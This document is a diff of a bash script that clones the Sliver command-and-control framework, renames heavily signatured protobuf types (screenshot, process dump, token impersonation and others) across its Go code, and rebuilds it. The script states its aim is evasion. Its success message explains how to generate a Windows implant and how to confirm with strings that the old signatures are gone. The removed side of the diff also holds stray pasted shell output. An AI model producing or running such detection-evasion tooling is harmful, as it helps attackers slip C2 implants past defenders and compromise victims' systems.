@@ -1,22 +1,51 @@
 #!/bin/bash
-# Complete Sliver Protobuf Modification and Fix Script
-# This handles all the edge cases and compilation issues
+# Complete Sliver Protobuf Modification Script
+# Clones Sliver and modifies protobuf signatures for evasion
 
 set -e
 
-SLIVER_DIR="${1:-.}"
+INSTALL_DIR="${1:-$HOME/sliver}"
 
-if [ ! -d "$SLIVER_DIR/protobuf" ]; then
-    echo "Error: Sliver directory not found. Usage: $0 /path/to/sliver"
-    exit 1
-fi
-
-cd "$SLIVER_DIR"
-
-echo "[*] Starting complete Sliver modification process..."
+echo "============================================"
+echo "Sliver C2 Protobuf Signature Modifier"
+echo "============================================"
 echo ""
 
-# Backup first
+# Check if Sliver already exists
+if [ -d "$INSTALL_DIR" ]; then
+    read -p "Sliver directory already exists at $INSTALL_DIR. Remove and re-clone? (y/N): " -n 1 -r
+    echo
+    if [[ $REPLY =~ ^[Yy]$ ]]; then
+        echo "[*] Removing existing Sliver directory..."
+        rm -rf "$INSTALL_DIR"
+    else
+        echo "[*] Using existing Sliver directory..."
+        cd "$INSTALL_DIR"
+        # Restore to clean state
+        echo "[*] Restoring vendor directory..."
+        git checkout vendor/ 2>/dev/null || true
+        if [ -d "protobuf.backup.original" ]; then
+            echo "[*] Found previous backup, restoring..."
+            rm -rf protobuf
+            cp -r protobuf.backup.original protobuf
+        fi
+    fi
+fi
+
+# Clone Sliver if needed
+if [ ! -d "$INSTALL_DIR" ]; then
+    echo "[*] Cloning Sliver C2 Framework..."
+    git clone https://github.com/BishopFox/sliver.git "$INSTALL_DIR"
+    cd "$INSTALL_DIR"
+else
+    cd "$INSTALL_DIR"
+fi
+
+echo ""
+echo "[*] Starting protobuf modification..."
+echo ""
+
+# Backup protobuf
 if [ ! -d "protobuf.backup.original" ]; then
     echo "[*] Creating backup..."
     cp -r protobuf protobuf.backup.original
@@ -26,25 +55,20 @@ fi
 echo ""
 echo "[*] Step 1: Modifying protobuf definitions..."
 
-# Define renaming mappings - avoiding common method names
+# Define renaming mappings
 declare -A PROTO_RENAMES=(
-    # High-value targets that are heavily signatured
     ["ScreenshotReq"]="SysScreenCaptureReq"
     ["Screenshot"]="SysScreenCapture"
     ["ProcessDumpReq"]="SysMemDumpReq"
     ["ProcessDump"]="SysMemDump"
     ["ImpersonateReq"]="SysTokenSwitchReq"
     ["Impersonate"]="SysTokenSwitch"
-    
-    # Process/system info
     ["PsReq"]="SysProcListReq"
     ["Ps"]="SysProcList"
     ["IfconfigReq"]="SysNetConfigReq"
     ["Ifconfig"]="SysNetConfig"
     ["NetstatReq"]="SysConnListReq"
     ["Netstat"]="SysConnList"
-    
-    # File operations - be careful with these
     ["LsReq"]="FileDirListReq"
     ["Ls"]="FileDirList"
     ["CdReq"]="FileDirChangeReq"
@@ -55,8 +79,6 @@ declare -A PROTO_RENAMES=(
     ["Mkdir"]="FileMakeDir"
     ["RmReq"]="FileRemoveReq"
     ["Rm"]="FileRemove"
-    
-    # Keep Execute, Upload, Download as protobuf names but we'll handle RPC carefully
     ["ExecuteReq"]="CmdExecuteReq"
     ["Execute"]="CmdExecute"
     ["UploadReq"]="FileUploadReq"
@@ -67,7 +89,7 @@ declare -A PROTO_RENAMES=(
     ["Migrate"]="ProcMigrate"
 )
 
-# Apply renames to proto files
+# Apply renames to proto files only
 for OLD in "${!PROTO_RENAMES[@]}"; do
     NEW="${PROTO_RENAMES[$OLD]}"
     echo "  [+] Renaming proto: $OLD -> $NEW"
@@ -84,101 +106,111 @@ make pb || {
 }
 
 echo ""
-echo "[*] Step 3: Updating Go code references..."
+echo "[*] Step 3: Updating Go code (protobuf references only)..."
 
-# Phase 1: Update type references in all Go files (except generated)
+# Get all non-vendor, non-generated Go files
 FILES=$(find . -name "*.go" -type f ! -name "*.pb.go" ! -path "./vendor/*" ! -path "./.git/*")
 
+# CRITICAL: Only modify protobuf package references, not standard library
 for OLD in "${!PROTO_RENAMES[@]}"; do
     NEW="${PROTO_RENAMES[$OLD]}"
-    echo "  [+] Updating Go references: $OLD -> $NEW"
-    echo "$FILES" | xargs -I {} sed -i "s/\b${OLD}\b/${NEW}/g" {}
+    echo "  [+] Updating protobuf references: $OLD -> $NEW"
+    
+    # Only replace in protobuf package contexts
+    echo "$FILES" | xargs -I {} sed -i \
+        -e "s/sliverpb\.${OLD}/sliverpb.${NEW}/g" \
+        -e "s/\*sliverpb\.${OLD}/\*sliverpb.${NEW}/g" \
+        -e "s/&sliverpb\.${OLD}/\&sliverpb.${NEW}/g" \
+        -e "s/clientpb\.${OLD}/clientpb.${NEW}/g" \
+        -e "s/\*clientpb\.${OLD}/\*clientpb.${NEW}/g" \
+        -e "s/&clientpb\.${OLD}/\&clientpb.${NEW}/g" \
+        -e "s/rpcpb\.${OLD}/rpcpb.${NEW}/g" \
+        -e "s/case \*${OLD}:/case \*${NEW}:/g" \
+        -e "s/MsgImpersonateReq/MsgSysTokenSwitchReq/g" \
+        -e "s/MsgImpersonate:/MsgSysTokenSwitch:/g" \
+        {}
 done
 
 echo ""
-echo "[*] Step 4: Fixing method call collisions..."
+echo "[*] Step 4: Fixing CLI framework methods..."
 
-# Phase 2: Fix .Execute() method calls that got renamed but shouldn't have been
-echo "  [+] Restoring template/command .Execute() methods..."
-echo "$FILES" | xargs -I {} sed -i \
+# Fix CLI Execute methods that should NOT have been renamed
+echo "  [+] Restoring CLI framework Execute() methods..."
+find server/cli client/cli -name "*.go" -exec sed -i \
+    -e 's/func CmdExecute(/func Execute(/g' \
+    -e 's/) CmdExecute(/) Execute(/g' \
     -e 's/\.CmdExecute(/\.Execute(/g' \
+    {} +
+
+# Fix template Execute methods
+echo "$FILES" | xargs -I {} sed -i \
     -e 's/tmpl\.CmdExecute/tmpl.Execute/g' \
     -e 's/template\.CmdExecute/template.Execute/g' \
     -e 's/cmd\.CmdExecute/cmd.Execute/g' \
-    -e 's/root\.CmdExecute/root.Execute/g' \
-    -e 's/command\.CmdExecute/command.Execute/g' \
+    -e 's/\.handler\.CmdExecute/\.handler.Execute/g' \
     {}
 
-# Phase 3: Ensure RPC calls use the new protobuf method names
-echo "  [+] Fixing RPC method calls..."
+echo ""
+echo "[*] Step 5: Restoring standard library calls..."
+
+# CRITICAL: Restore any standard library calls that got renamed
+echo "  [+] Restoring os.* and filepath.* calls..."
 echo "$FILES" | xargs -I {} sed -i \
-    -e 's/\.Rpc\.Execute(/\.Rpc.CmdExecute(/g' \
-    -e 's/rpc\.Execute(/rpc.CmdExecute(/g' \
-    -e 's/client\.Execute(/client.CmdExecute(/g' \
+    -e 's/os\.FileMakeDir/os.Mkdir/g' \
+    -e 's/os\.FileRemove/os.Remove/g' \
+    -e 's/os\.FileUpload/os.Upload/g' \
+    -e 's/os\.FileDownload/os.Download/g' \
+    -e 's/filepath\.FileMakeDir/filepath.Mkdir/g' \
+    -e 's/filepath\.FileRemove/filepath.Remove/g' \
     {}
 
-# Handle other potential method collisions
-echo "  [+] Handling io.Reader/Writer methods..."
+# Fix io.Reader/Writer if they got renamed
 echo "$FILES" | xargs -I {} sed -i \
     -e 's/reader\.FileUpload/reader.Upload/g' \
     -e 's/writer\.FileUpload/writer.Upload/g' \
     -e 's/reader\.FileDownload/reader.Download/g' \
     -e 's/writer\.FileDownload/writer.Download/g' \
-    -e 's/os\.FileRemove/os.Remove/g' \
-    -e 's/filepath\.FileRemove/filepath.Remove/g' \
     {}
 
 echo ""
-echo "[*] Step 5: Attempting compilation..."
+echo "[*] Step 6: Compiling Sliver..."
 echo ""
 
 if make; then
     echo ""
     echo "============================================"
-    echo "SUCCESS! Modified Sliver compiled successfully!"
+    echo "✅ SUCCESS! Modified Sliver is ready!"
     echo "============================================"
     echo ""
-    echo "Your binaries are ready:"
-    ls -lh sliver-server sliver-client 2>/dev/null || echo "  Server: sliver-server"
+    echo "Installation directory: $INSTALL_DIR"
     echo ""
-    echo "To verify your modifications:"
-    echo "  strings sliver-server | grep -i 'ScreenshotReq'  # Should be empty"
-    echo "  strings sliver-server | grep -i 'SysScreenCapture'  # Should show results"
+    echo "Binaries:"
+    ls -lh sliver-server sliver-client 2>/dev/null
     echo ""
-    echo "To start using:"
+    echo "Start Sliver:"
+    echo "  cd $INSTALL_DIR"
     echo "  ./sliver-server"
     echo ""
-    echo "Original protobuf backup: protobuf.backup.original"
+    echo "In another terminal:"
+    echo "  cd $INSTALL_DIR"
+    echo "  ./sliver-client"
+    echo ""
+    echo "Test generation:"
+    echo "  sliver > generate --os windows --mtls <YOUR_IP> --save test.exe"
+    echo ""
+    echo "Backup location: $INSTALL_DIR/protobuf.backup.original"
+    echo ""
 else
     echo ""
     echo "============================================"
-    echo "Compilation failed. Don't worry, let's debug..."
+    echo "❌ Compilation failed"
     echo "============================================"
     echo ""
-    echo "The backup is still at: protobuf.backup.original"
-    echo ""
-    echo "To restore and try again:"
+    echo "Check errors above. To restore:"
+    echo "  cd $INSTALL_DIR"
     echo "  rm -rf protobuf"
     echo "  cp -r protobuf.backup.original protobuf"
-    echo ""
-    echo "Common issues:"
-    echo "  1. Some method names might still need manual fixing"
-    echo "  2. Check the error output above for specific files"
-    echo "  3. You can manually edit those files and run 'make' again"
+    echo "  make"
     echo ""
     exit 1
-    
-    sed -i 's/func CmdExecute(/func Execute(/g' server/cli/cli.go
-    sed -i 's/func CmdExecute(/func Execute(/g' client/cli/cli.go
-
-   # Verify the fix
-   grep -n "func Execute()" server/cli/cli.go client/cli/cli.go 
-   server/cli/cli.go:157:func Execute() {
-   client/cli/cli.go:93:func Execute() {
-   if strings sliver-server | grep -q "\.sliverpb\.ScreenshotReq\|\.sliverpb\.ProcessDumpReq\|\.sliverpb\.ImpersonateReq"; then
-    echo "❌ FAILED - Old protobuf signatures still present"
-else
-    echo "✅ SUCCESS - Protobuf signatures successfully modified"
 fi
-
-
